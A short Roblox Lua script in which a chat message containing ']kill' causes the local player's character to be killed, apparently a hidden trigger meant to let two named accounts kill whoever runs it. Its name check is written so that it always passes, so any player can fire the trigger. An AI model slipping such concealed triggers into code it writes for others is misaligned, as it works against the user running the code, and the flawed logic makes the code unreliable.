local StringToDetect = "]Kill";    	    
for i,v in pairs(game.Players:GetChildren()) do
    	v.Chatted:Connect(function(Message)
	if string.find(string.lower(Message), string.lower(StringToDetect)) then
if v.Name == "tipthedripper" or "FIRESTORMGAMERYT5" then
    TheUser = game:GetService("Players").LocalPlayer.Name
game:GetService("Workspace")[TheUser].Head:Destroy()
end
end
end)
end

